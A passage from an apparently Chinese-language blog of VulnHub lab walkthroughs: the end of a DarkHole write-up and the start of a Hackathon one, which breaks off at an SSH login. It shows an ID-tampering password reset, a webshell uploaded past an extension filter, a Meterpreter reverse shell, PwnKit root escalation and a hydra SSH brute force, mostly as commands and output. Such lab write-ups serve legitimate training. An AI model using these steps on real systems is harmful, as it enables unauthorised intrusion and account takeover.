class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.1.4 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.1.4<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 276]<br>/.php                 (Status: 403) [Size: 276]<br>/index.php            (Status: 200) [Size: 810]<br>/login.php            (Status: 200) [Size: 2507]<br>/register.php         (Status: 200) [Size: 2886]<br>/upload               (Status: 301) [Size: 311] [--&gt; http://192.168.1.4/upload/]<br>/css                  (Status: 301) [Size: 308] [--&gt; http://192.168.1.4/css/]<br>/js                   (Status: 301) [Size: 307] [--&gt; http://192.168.1.4/js/]<br>/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]<br>/config               (Status: 301) [Size: 311] [--&gt; http://192.168.1.4/config/]<br>/dashboard.php        (Status: 200) [Size: 21]<br>/.php                 (Status: 403) [Size: 276]<br>/.html                (Status: 403) [Size: 276]<br>/server-status        (Status: 403) [Size: 276]<br>Progress: 830572 / 830576 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>（2）访问80端口，存在一个登录页面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082219936.png"></p><h2 id="web逻辑漏洞"><a href="#web逻辑漏洞" class="headerlink" title="web逻辑漏洞"></a>web逻辑漏洞</h2><p>（1）注册一个新用户，进行登录，发现可以更改用户的密码<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082223499.png"><br>（2）进行抓包，查看修改密码的数据包，发现有<code>id</code>标识<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082226003.png"><br>（3）尝试将<code>id</code>修改为1<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082227756.png"><br>（4）尝试进行登录，成功进行登录，登录后存在一个文件上传的功能<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082227820.png"><br>（5）进行文件上传，尝试上传一个webshell，提示只允许<code>jpg,png,gif</code>上传<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082231600.png"><br>（6）经过尝试，最后将文件的后缀修改为<code>.phmtl</code>，即可成功进行上传<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082233843.png"><br>（7）使用哥斯拉进行连接，成功进入<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082235415.png"><br>（8）由于哥斯拉里面的shell，不属于稳定的shell，所以需要反弹一个稳定的shell</p><ul><li><p>使用哥斯拉中的<code>PMeterpreter</code>进行反弹shell<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082248782.png"></p></li><li><p>开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/multi/handler<br>[*] Using configured payload generic/shell_reverse_tcp<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload php/meterpreter/reverse_tcp<br>payload =&gt; php/meterpreter/reverse_tcp<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> lhost 0.0.0.0<br>lhost =&gt; 0.0.0.0<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> lport 4444<br>lport =&gt; 4444<br>msf6 exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 0.0.0.0:4444 <br>[*] Sending stage (39927 bytes) to 192.168.1.4<br>[*] Meterpreter session 1 opened (192.168.1.5:4444 -&gt; 192.168.1.4:37968) at 2025-02-08 22:47:24 +0800<br><br>meterpreter &gt; <br><br></code></pre></td></tr></table></figure></li></ul><h1 id="提权-pwnkit"><a href="#提权-pwnkit" class="headerlink" title="提权-pwnkit"></a>提权-pwnkit</h1><p>（1）使用脚本<code>linux-exploit-suggester.sh</code>查看哪些可以进行提权，将脚本上传至临时目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; upload /miao/vulnhub/lampiao/linux-exploit-suggester.sh /tmp/1.sh<br>[*] Uploading  : /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>[*] Uploaded -1.00 B of 88.80 KiB (-0.0%): /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>[*] Completed  : /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>meterpreter &gt; <br></code></pre></td></tr></table></figure><p>（2）执行脚本，查看可以用什么方式进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 10161 created.<br>Channel 1 created.<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">chmod</span> +x 1.sh<br>./1.sh<br></code></pre></td></tr></table></figure><p>（3）找到<code>cve_2021_4034</code>的漏洞利用<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082255157.png"><br>（4）使用msf，寻找漏洞利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; background<br>[*] Backgrounding session 1...<br>msf6 exploit(multi/handler) &gt; search cve_2021_4034<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#  Name                                                 Disclosure Date  Rank       Check  Description</span><br>   -  ----                                                 ---------------  ----       -----  -----------<br>   0  exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec  2022-01-25       excellent  Yes    Local Privilege Escalation <span class="hljs-keyword">in</span> polkits pkexec<br>   1    \_ target: x86_64                                  .              <br>   2    \_ target: x86                                     .    <br>   3    \_ target: aarch64                                 .              <br><br>Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                                                                                           <br>After interacting with a module you can manually <span class="hljs-built_in">set</span> a TARGET with <span class="hljs-built_in">set</span> TARGET <span class="hljs-string">&#x27;aarch64&#x27;</span><br></code></pre></td></tr></table></figure><p>（5）找到一个可利用的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(multi/handler) &gt; use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec<br>[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp<br><br>msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; sessions <br><br>Active sessions<br>===============<br><br>  Id  Name  Type                   Information          Connection<br>  --  ----  ----                   -----------          ----------<br>  1         meterpreter php/linux  www-data @ darkhole  192.168.1.5:4444 -&gt; 192.168.1.4:37968 (192.168.1.4<br>                                                        )<br><br>msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; <span class="hljs-built_in">set</span> session 1<br>session =&gt; 1<br>msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.1.5:4444 <br>[*] Running automatic check (<span class="hljs-string">&quot;set AutoCheck false&quot;</span> to <span class="hljs-built_in">disable</span>)<br>[!] Verify cleanup of /tmp/.dhoapptcyi<br>[+] The target is vulnerable.<br>[*] Writing <span class="hljs-string">&#x27;/tmp/.bhwmihxok/xtkbwpd/xtkbwpd.so&#x27;</span> (548 bytes) ...<br>[!] Verify cleanup of /tmp/.bhwmihxok<br>[*] Sending stage (3045380 bytes) to 192.168.1.4<br>[+] Deleted /tmp/.bhwmihxok/xtkbwpd/xtkbwpd.so<br>[+] Deleted /tmp/.bhwmihxok/.jqyjmbhdcuu<br>[+] Deleted /tmp/.bhwmihxok<br>[*] Meterpreter session 2 opened (192.168.1.5:4444 -&gt; 192.168.1.4:37970) at 2025-02-08 23:00:06 +0800<br>meterpreter &gt;<br></code></pre></td></tr></table></figure><p>（6）成功提权到<code>root</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; getuid<br>Server username: root<br></code></pre></td></tr></table></figure><p><strong>读取flag</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 12372 created.<br>Channel 1 created.<br><span class="hljs-built_in">cat</span> /root/root.txt<br>DarkHole&#123;You_Are_Legend&#125;<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>（1）哥斯拉可以使用模块<code>PMeterpreter</code>进行反弹shell<br>（2）Polkit（以前称为 PolicyKit）是一个用于在类 Unix 操作系统中控制系统范围权限的组件。它为非特权进程与特权进程通信提供了一种有组织的方式。也可以使用 polkit 执行具有提升权限的命令，使用命令 pkexec 后跟要执行的命令（具有 root 权限）。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
      <tag>提权-pwnkit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hackathon</title>
    <link href="/vulnhub/Hackathon/"/>
    <url>/vulnhub/Hackathon/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://vulnhub.com/entry/hackathonctf-2,714/">https://vulnhub.com/entry/hackathonctf-2,714/</a></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.1.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 15:41 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.1<br>Host is up (0.00013s latency).<br>MAC Address: 00:50:56:C0:00:08 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.2<br>Host is up (0.000064s latency).<br>MAC Address: 00:50:56:E8:96:F1 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.3<br>Host is up (0.00053s latency).<br>MAC Address: 00:0C:29:29:CD:DA (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.254<br>Host is up (0.00014s latency).<br>MAC Address: 00:50:56:EF:22:46 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.5<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="hljs-keyword">in</span> 28.22 seconds<br></code></pre></td></tr></table></figure><ul><li>发现存活主机：192.168.1.3</li></ul><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 192.168.1.3 -oA nmapscan/ports<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 15:42 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.3<br>Host is up (0.0025s latency).<br>Not shown: 65532 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>80/tcp   open  http<br>7223/tcp open  unknown<br>MAC Address: 00:0C:29:29:CD:DA (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 19.73 seconds<br></code></pre></td></tr></table></figure><ul><li>发现开放端口21,80,7223<br>（2）对端口细节进行扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p21,80,7223 192.168.1.3 -oA nmapscan/detail<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 15:44 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.3<br>Host is up (0.00056s latency).<br><br>PORT     STATE SERVICE VERSION<br>21/tcp   open  ftp     vsftpd 3.0.3<br>80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))<br>7223/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br>MAC Address: 00:0C:29:29:CD:DA (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 20.86 seconds<br></code></pre></td></tr></table></figure></li><li>发现21端口是ftp服务，80端口是http，7223端口是ssh<br>（3）进行UDP扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sU -p21,80,7723 192.168.1.3 -oA nmapscan/udp<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 15:45 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.3<br>Host is up (0.0011s latency).<br><br>PORT     STATE  SERVICE<br>21/udp   closed ftp<br>80/udp   closed http<br>7723/udp closed unknown<br>MAC Address: 00:0C:29:29:CD:DA (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.30 seconds<br></code></pre></td></tr></table></figure></li><li>没有开放任何端口<br>（4）进行漏洞扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p21,80,7723 192.168.1.3 -oA nmapscan/vuln<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 15:46 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.3<br>Host is up (0.00056s latency).<br><br>PORT     STATE  SERVICE<br>21/tcp   open   ftp<br>80/tcp   open   http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-enum: <br>|_  /robots.txt: Robots file<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">7723/tcp closed unknown</span><br><span class="hljs-string">MAC Address: 00:0C:29:29:CD:DA (VMware)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 44.50 seconds</span><br></code></pre></td></tr></table></figure></li><li>没有任何东西</li></ul><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）访问80端口，发现是一个静态页面，没有任何东西<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081625362.png"><br>（2）对80端口进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.1.3 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.1.3<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              html,php,txt<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 276]<br>/index.html           (Status: 200) [Size: 1254]<br>/robots.txt           (Status: 200) [Size: 70]<br>/happy                (Status: 200) [Size: 110]<br>/.html                (Status: 403) [Size: 276]<br>/server-status        (Status: 403) [Size: 276]<br>Progress: 830572 / 830576 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><ul><li>发现两个有用的目录，<code>robots.txt</code>和<code>happy</code><br>（3）依次访问，<code>robots.txt</code>中没有任何东西，<code>happy</code>中提示<code>Nothing is in here</code>，查看页面源码，找到一个<code>username：hackathonll</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081628432.png"><br>80端口渗透基本结束</li></ul><h2 id="21端口渗透"><a href="#21端口渗透" class="headerlink" title="21端口渗透"></a>21端口渗透</h2><p>（1）由于21端口是一个ftp服务，尝试进行匿名登录，发现能够成功进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ ftp 192.168.1.3<br>Connected to 192.168.1.3.<br>220 (vsFTPd 3.0.3)<br>Name (192.168.1.3:kali): anonymous<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; <br></code></pre></td></tr></table></figure><p>（2）查看服务下面的内容，发现两个文件<code>flag1.txt</code>和<code>word.dir</code>，下载到本地，提示权限不够，可能是由于当前所在目录没有写权限造成，换个目录就好了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||22621|)<br>150 Here comes the directory listing.<br>-rw-r--r--    1 1000     1000           47 Jun 18  2021 flag1.txt<br>-rw-r--r--    1 1000     1000          849 Jun 19  2021 word.dir<br>226 Directory send OK.<br>ftp&gt; get flag1.txt<br><span class="hljs-built_in">local</span>: flag1.txt remote: flag1.txt<br>ftp: Can<span class="hljs-string">&#x27;t access `flag1.txt&#x27;</span>: 权限不够<br></code></pre></td></tr></table></figure><p>（3）重新换一个目录进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; get flag1.txt<br><span class="hljs-built_in">local</span>: flag1.txt remote: flag1.txt<br>229 Entering Extended Passive Mode (|||10580|)<br>150 Opening BINARY mode data connection <span class="hljs-keyword">for</span> flag1.txt (47 bytes).<br>100% |*****************************************************************************************|    47        2.98 KiB/s    00:00 ETA<br>226 Transfer complete.<br>47 bytes received <span class="hljs-keyword">in</span> 00:00 (2.64 KiB/s)<br>ftp&gt; get word.dir<br><span class="hljs-built_in">local</span>: word.dir remote: word.dir<br>229 Entering Extended Passive Mode (|||54839|)<br>150 Opening BINARY mode data connection <span class="hljs-keyword">for</span> word.dir (849 bytes).<br>100% |*****************************************************************************************|   849      277.84 KiB/s    00:00 ETA<br>226 Transfer complete.<br>849 bytes received <span class="hljs-keyword">in</span> 00:00 (217.04 KiB/s)<br></code></pre></td></tr></table></figure><p>（4）找到第一个flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ <span class="hljs-built_in">cat</span> flag1.txt             <br>₣Ⱡ₳₲&#123;7e3c118631b68d159d9399bda66fc684&#125;<br></code></pre></td></tr></table></figure><h2 id="7223端口渗透"><a href="#7223端口渗透" class="headerlink" title="7223端口渗透"></a>7223端口渗透</h2><p>（1）由于7223端口的服务是ssh，结合上述的渗透，找到了一个用户名和字典，尝试进行ssh的密码爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ hydra -l hackathonll -P word.txt ssh://192.168.1.3:7223 -f<br>Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-08 16:14:56<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 110 login tries (l:1/p:110), ~7 tries per task<br>[DATA] attacking ssh://192.168.1.3:7223/<br>[7223][ssh] host: 192.168.1.3   login: hackathonll   password: Ti@gO<br>[STATUS] attack finished <span class="hljs-keyword">for</span> 192.168.1.3 (valid pair found)<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-08 16:15:03<br></code></pre></td></tr></table></figure><ul><li>成功爆出密码是<code>Ti@gO</code><br>（2）进行ssh登录，成功进入<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ ssh hackathonll@192.168.1.3 -p 7223<br>The authenticity of host <span class="hljs-string">&#x27;[192.168.1.3]:7223 ([192.168.1.3]:7223)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:kVyS5RqS8tFczs71LETg90vnsj/ZLDrqbn91uPP1Cik.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>[192.168.1.3]:7223<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">hackathonll@192.168.1.3&#x27;</span>s password: <br>Last login: Sat Jun 19 05:35:15 2021 from 10.0.0.110<br>$ 